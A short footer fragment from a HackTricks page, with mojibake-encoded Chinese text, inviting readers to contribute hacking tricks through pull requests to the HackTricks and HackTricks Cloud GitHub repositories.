* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
